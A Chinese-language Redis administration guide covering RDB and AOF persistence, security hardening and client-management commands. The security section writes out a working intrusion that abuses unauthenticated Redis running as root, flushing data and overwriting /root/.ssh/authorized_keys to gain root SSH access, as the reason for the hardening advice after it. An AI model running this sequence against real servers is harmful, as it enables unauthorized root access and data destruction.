# redis管理

## 持久化

Redis提供了RDB和AOF两种持久化机制，能够避免服务异常后数据丢失问题。当下次服务重启时优先使用AOF恢复，没有则用RDB文件恢复。

如果不需要持久化也可以关闭持久化，一般情况下应该两种都使用。

### RDB

RDB持久化是将当前数据生成快照并保存。包括自动和手工触发两种方式。

优缺点包括

- RDB是压缩的单一文件，占用空间非常小。非常适合数据的迁移和分发。恢复大数据时速度也更快。

- 根据运行机制，持久化时对redis主进程影响最小。但在数据集大时fork出子进程会耗时，导致短暂的不响应客户端。

- 只能做定时备份，不是实时持久化，有可能导致数据丢失。

#### 相关命令

| 命令   | 说明   |
|--------|--------|
|save           | 以rdb文件保存数据的快照         |
|bgsave         | 触发后台存盘                    |
|lastsave       | 最近一次存盘成功对应的unix时间戳|
|config get dir | 备份目录                        |
|config get dbfilename| 备份文件                  |

### AOF

append only file持久化，以独立日志的方式记录了每次写命令，恢复时按顺序依次重新执行命令恢复出数据。默认是关闭的，需要开启才生效。

写入的内容匹配程序对外接口协议格式。这样的原因是文本协议具有可读性，方便直接修改和处理。按照统一协议处理，避免了二次处理。

AOF的优缺点包括

- 日志文件近似实时同步保存，减少了异常发生时数据的丢失。

- 日志文件易于阅读和进行修改。

- 日志文件相对较大，恢复速度比RDB慢。

#### 文件同步策略

追加日志内容时，可以通过appendfsync参数控制写入策略。

- always 写入aofbuf后立刻调用fsync操作同步到日志文件。

- everysec。默认配置，写入aofbuf后调用系统write操作，由专门线程每秒执行fsync刷数据落盘。

- no 写入aofbuf后只执行write操作，不做fsync。由操作系统自行管理落盘。

#### 重写机制

随着日志不断追加，日志文件会越来越大，为了解决此问题。redis引入了aof重写机制，将库里的数据转换为写入命令产生新的aof文件。

重写数据时将丢弃失效数据，将多命令合并，只保留最新记录对应日志有效的减少了数据冗余。

aof重写过程可以手工触发或者自动触发

自动触发条件是当前文件空间大于auto-aof-rewrite-min-size(默认64M)且aof文件空间比例超过阀值auto-aof-rewrite-percentage

aof_current_size>auto-aof-rewrite-min-size && (aof_current_size-aof_base_size)/aof_base_size>=auto-aof-rewrite-percentage

#### 相关命令

| 命令   | 说明   |
|--------|--------|
|bgrewriteaof        | 手工触发aof重写      |
|info persistence    | 显示持久化度量信息   |
|congfig get appendfsync| 获取设置同步文件策略 |
|config get *aof*    | aof其他配置设置      |

### 其他实践

#### 备份文件损坏的修复

redis提供了两个工具用来检测并尝试修复备份文件

```
[root@db3 ~]# redis-check-rdb
Usage: redis-check-rdb <rdb-file-name>
[root@db3 ~]# redis-check-aof 
Usage: redis-check-aof [--fix] <file.aof>
```

#### RDB和AOF之间的切换

关闭RDB，开启AOF步骤。正常情况下应该考虑同时开启两种持久化机制，未来的redis版本会考虑将两者备份机制合一。

- 执行最新的RDB备份，将备份多备份一份。

- 开启AOF备份，config set appendonly yes/关闭RDB备份config set save ""

- 确保AOF文件写入成功

BGSAVE和BGREWRITEAOF不能同时执行，两者都会对磁盘进行大量的IO操作。


## 安全性

### 一次入侵

当一个redis服务以root运行在linux上并对外暴露服务时具有非常大的危险性。

```
# 原先需要密码才能登陆
[root@db2 ~]# ssh db3
root@db3's password: 
Last login: Tue Jan 23 13:38:07 2018 from x.x.x.x
[root@db3 ~]# 
# 默认免密码登陆redis
[root@db2 ~]# redis-cli -h db3
db3:6379> keys *
1) "key:__rand_int__"
2) "counter:__rand_int__"
3) "mylist"
4) "key1"
db3:6379> flushdb
OK
# 将本机sshkey上传
db3:6379> set crackit "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZPe7FYtSoNqVr9hMN3B+3QSbsgkGqzzyqlcSVLzhoRcl54DF+UagvdFR2noOyP63LEIiI/tg1rbiqLpJMcDrTRjpaU6OX3neqgEBCbVQM5lcudupeUakUlvcLIp+UQb0SunGpry5YCd76zo9Ur159T1Bx+6irObfDPzYYG9TvCZ6E8nFA9v4MlFWWK1JLl16Vn1urjEiqDRaQNGHKnK4xuGp9Lwh3LGYhasDtG30kkfYX8TqqIWuQvb88I1GSMJvVKJDsmJEClpxGuF4pist36Vi/ykH/9UfAmySdfIf/FQ6/+bpqBm269iBfo1kwgMz5Mu0P4A+PMsI5/umR6Qkn root@db2\n\n\n"
OK
# 修改默认配置并存盘，将导致存盘文件覆盖目标机上的authkey信息
db3:6379> config get rdbcompression
1) "rdbcompression"
2) "yes"
db3:6379> config set rdbcompression no
OK
db3:6379> config set dir "/root/.ssh/"
OK
db3:6379> config set dbfilename "authorized_keys"
OK
db3:6379> save
OK
db3:6379> exit
[root@db2 ~]# 
# 无密码以root登陆了被入侵的机器
[root@db2 ~]# ssh db3
Last login: Tue Jan 23 13:38:56 2018 from x.x.x.x
[root@db3 ~]# 
```

### 安全配置

Redis被设计成仅有可信环境下的可信用户才可以访问。因此需要进行适当的配置以减小安全风险

#### 密码机制

redis支持配置成通过密码访问。

服务端使用 redis-server --requirepass newpassword

客户端使用 redis-cli -a newpassword或使用auth子命令

密码要足够复杂，否则容易被暴力破解。主从之间的同步也要配置密码访问。auth子命令是明文传递的(redis协议)，不建议使用。

#### 伪装危险命令

redis中很多命令具有一定的副作用，例如keys */save/config/shutdown/flushall。很容易导致服务阻塞，数据丢失或配置异常。

因此提供了rename-command配置来对一些命令改名。例如：rename-command flushdb xxxxiiii

rename只支持配置文件修改，应该在第一次运行前就确定。

主从节点之间的配置要保持一致，rdb/aof备份文件保存的内容也要和配置一致。同时还需要修改对应第三方客户端库。

#### 其他

- 开启防火墙，限制绑定网卡，不使用默认端口。

- 定期备份数据并转移到第三方保存

- 使用非redis用户启动服务

### spiped



## 客户端管理

redis提供了一系列命令用来显示客户端信息，连接状态等并进行对应管理。利用好这部分命令可以更好的维护。

| 命令   | 说明   |
|--------|--------|
|auth pwd   | 验证密码    |
|echo msg   | 回显消息    |
|ping       | ping服务器  |
|quit       | 推出连接    |
|select db  | 选择数据库  |
|monitor    | 实时监控服务器        |
|client list   | 显示客户端连接列表 |
|client kill   | 关闭指定客户端     |
|client getname| 获取当前连接名称   |
|client setname| 设置当前连接名称   |
|client pause  | 暂停处理客户端命令 |
|client reply  |                    |
|info clients  | 获取clients统计信息|
|info stats    | 部分连接统计信息   |
|config get maxclients| 最大连接数  |
|config get timeout   | 空闲超时释放|

### clientlist详解

命令演示
```
127.0.0.1:6379> client list
id=2 addr=127.0.0.1:45176 fd=5 name= age=9621 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=client
127.0.0.1:6379>
```

| 字段   | 说明   |
|--------|--------|
|id      | 唯一的64位的客户端ID(Redis 2.8.12加入)|
|addr    | 客户端的地址和端口                    |
|fd      | 套接字所使用的文件描述符              |
|name    | 连接名                                |
|age     | 以秒计算的已连接时长                  |
|idle    | 以秒计算的空闲时长                    |
|flags   | 客户端flag(详见下表)                  |
|db      | 该客户端正在使用的数据库 ID           |
|sub     | 已订阅频道的数量                      |
|psub    | 已订阅模式的数量                      |
|multi   | 在事务中被执行的命令数量              |
|qbuf    | 输入缓冲区的长度（字节为单位， 0 表示没有分配查询缓冲区）   |
|qbuf-free| 输入缓冲区剩余空间的长度（字节为单位， 0 表示没有剩余空间）|
|obl     | 输出缓冲区的长度（字节为单位， 0 表示没有分配输出缓冲区）   |
|oll     | 输出列表包含的对象数量（当输出缓冲区没有剩余空间时，命令回复会以字符串对象的形式被入队到这个队列里）||
|omem    | 输出缓冲区和输出列表占用的内存总量    |
|events  | 文件描述符事件(r/w)                   |
|cmd     | 最近一次执行的命令                    |

输出缓冲可以进行如下设置
```
[root@db3 ~]# cat /etc/redis.conf |grep client-output
# The syntax of every client-output-buffer-limit directive is the following:
# class分三种表示普通客户端，slave客户端，订阅客户端
# hardlimit 表示达到限制立刻断开
# softlimit/softsec 表示达到限制多少秒立刻断开此客户端
# client-output-buffer-limit <class> <hard limit> <soft limit> <soft seconds>
client-output-buffer-limit normal 0 0 0
client-output-buffer-limit slave 256mb 64mb 60
client-output-buffer-limit pubsub 32mb 8mb 60
```

客户端列表里的flag表示了更详细的客户端类型
| flag字段   | 说明   |
|--------|--------|
|O | 客户端是MONITOR模式下的附属节点（slave） |
|S | 客户端是一般模式下（normal）的附属节点   |
|M | 客户端是主节点（master）                 |
|x | 客户端正在执行事务                       |
|b | 客户端正在等待阻塞事件                   |
|i | 客户端正在等待 VM I/O 操作（已废弃）     |
|d | 一个受监视（watched）的键已被修改， EXEC 命令将失败|
|c | 在将回复完整地写出之后，关闭链接         |
|u | 客户端未被阻塞（unblocked）              |
|U | 通过Unix套接字连接的客户端               |
|r | 客户端是只读模式的集群节点               |
|A | 尽可能快地关闭连接                       |
|N | 未设置任何 flag                          |


### 其他命令

- client setname/getname

用于设置/获取客户端名称。对特定的用户连接应该连接后立刻设置连接名，方便后续管理和监控。

- client kill ip:port

杀死指定的客户端连接。

- cliant pause timeout(ms)

阻塞客户端timeoutms数，此时所有客户端将被阻塞。只对普通和发布订阅客户端有效，主从复制用客户端不会被阻塞。

主要用来阻止用户处理占用CPU资源，快速将数据同步到另一端。

- monitor

监控redis下各客户端正在请求执行的命令，当redis并发连接过多时谨慎使用。否则会造成大量内存占用。

- info信息
```
127.0.0.1:6379> info clients
# Clients
# 当前连接数
connected_clients:1
# 所有输出缓冲区队列对象个数最大值
client_longest_output_list:0
# 所有输入缓冲区中占用的最大容量
client_biggest_input_buf:0
# 执行阻塞命令的客户端数
blocked_clients:0
127.0.0.1:6379> info stats
# Stats
# 历史总连接数
total_connections_received:1
# 被拒绝的连接数
rejected_connections:0
```

## 配置管理

